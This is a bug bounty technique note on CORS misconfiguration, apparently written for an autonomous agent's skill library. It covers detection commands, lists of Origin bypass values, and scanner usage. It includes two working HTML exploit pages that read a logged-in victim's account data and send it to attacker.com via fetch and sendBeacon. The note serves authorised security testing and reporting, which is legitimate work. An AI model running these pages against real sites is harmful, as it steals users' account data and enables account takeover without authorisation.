---
title: CORS Misconfiguration
created: 2026-03-10
tags: [skills-learned, cyber, cors]
type: technique
payout_ceiling: $5K–$25K (credential theft, ATO via credentialed cross-origin read)
auth_required: YES (requires victim to be authenticated; attacker hosts malicious page)
autonomy_level: EXECUTE
---

# CORS Misconfiguration

## Concept

Browser enforces Same-Origin Policy. CORS headers tell browser to allow cross-origin requests. Misconfiguration allows an attacker-controlled page to read authenticated responses from the target.

**Key headers — BOTH required for exploitability:**
```
Access-Control-Allow-Origin: https://evil.com    ← reflects attacker origin
Access-Control-Allow-Credentials: true           ← sends victim's cookies
```

Without `Allow-Credentials: true`, attacker can only read unauthenticated responses (low value). The combination is the critical finding.

**High-saturation warning:** Generic CORS on mature programs = deprioritized. Look for:
- Trusted subdomain bypass (null origin, specific subdomain misconfiguration)
- Internal CORS (intranet apps more permissive)
- CORS on API subdomains leaking auth tokens

---

## Detection

```bash
# Send Origin header, check response:
curl -s -H "Origin: https://evil.com" \
     -H "Cookie: session=abc" \
     https://target.com/api/userinfo -v 2>&1 | grep -i "access-control"

# Variants to test (try ALL):
Origin: https://evil.com                    # basic attacker origin
Origin: https://target.com.evil.com         # suffix bypass
Origin: null                                # sandbox iframe bypass
Origin: https://evil.target.com             # subdomain spoof (if wildcard)
Origin: http://target.com                   # HTTP vs HTTPS downgrade
Origin: https://TARGET.COM                  # case variation (rare)
Origin: https://noteviltarget.com           # if regex: contains("target.com")

# Quick loop test:
for origin in "https://evil.com" "null" "https://target.com.evil.com" "https://evil.target.com"; do
  echo -n "Testing $origin: "
  curl -s -o /dev/null \
    -H "Origin: $origin" \
    -H "Cookie: session=YOURTOKEN" \
    -D - https://target.com/api/me 2>&1 | grep -i "access-control-allow-origin"
done
```

**Automation:**
```bash
# corsy:
pip3 install corsy --break-system-packages
python3 corsy.py -u https://target.com/api/ -t 10

# CORScanner:
python3 cors_scan.py -u https://target.com

# Burp: Proxy → HTTP history → filter for ACAO header
# Look for responses that reflect the Origin value back
```

---

## Exploitation

### Standard credentialed CORS exploit (host on attacker server)
```html
<!DOCTYPE html>
<html>
<body>
<script>
fetch('https://target.com/api/account', {
  credentials: 'include',
  mode: 'cors'
})
.then(r => r.json())
.then(d => {
  // Exfil to attacker server
  fetch('https://attacker.com/steal?data=' + btoa(JSON.stringify(d)))
})
</script>
</body>
</html>
```

### null origin exploit (sandboxed iframe bypass)
```html
<!-- If server whitelists 'null' origin: -->
<iframe sandbox="allow-scripts allow-forms" srcdoc="
<script>
fetch('https://target.com/api/private', {credentials: 'include'})
.then(r => r.text())
.then(d => parent.postMessage(d, '*'))
</script>
"></iframe>
<script>
window.addEventListener('message', e => {
  navigator.sendBeacon('https://attacker.com/steal', e.data)
})
</script>
```

---

## Tools & Terminal

```bash
# corsy — comprehensive CORS scanner
pip3 install corsy --break-system-packages
python3 corsy.py -u https://target.com -t 10 --headers "Cookie: session=TOKEN"

# Burp Intruder: set Origin header value as payload position
# Payload list: origins_wordlist (build from subdomains + permutations)

# ffuf fuzz origins:
ffuf -u https://target.com/api/user \
  -H "Origin: FUZZ" \
  -H "Cookie: session=x" \
  -w origins_wordlist.txt \
  -mr "Access-Control-Allow-Credentials: true"
```

---

## Bypass / Edge Cases

- Preflight (OPTIONS) bypass — misconfiguration may only be in actual request, not preflight
- Simple requests (GET/POST + simple headers) skip preflight → can bypass preflight-only checks
- Internal CORS — intranet apps often wildcard `Access-Control-Allow-Origin: *`
- CORS ≠ auth bypass — still requires valid session cookie from victim
- Some servers only reflect Origin when `Origin` is in a whitelist → no reflection = not exploitable

---

## Differentiation for Mature Programs

Generic `Access-Control-Allow-Origin: *` on public endpoints = informational (no credentials possible).

**File-worthy variants:**
1. `ACAO: *` on authenticated endpoint + sensitive data returned = Medium
2. Reflected origin + `ACAC: true` on auth API = High (ATO chain possible)
3. `null` origin whitelisted + `ACAC: true` = High
4. Specific subdomain bypass where that subdomain is XSS-able = Critical (CORS + XSS chain)

---

## Filing Guidance

**Reflected origin + credentials:** High ($10K–$25K) — show PoC HTML + exfiltrated data in attacker console
**null origin:** High ($10K–$25K) — host sandboxed iframe PoC, show account data extracted
**CORS + XSS chain:** Critical ($25K+) — subdomain XSS enables reflected origin = full account takeover

Evidence: Host PoC HTML on GitHub Pages or attacker-controlled domain. Screenshot shows victim's account data in attacker browser console.

---

*CORS Misconfiguration v1.0 | Ingested 2026-03-10 | Owner: cyber-operator*
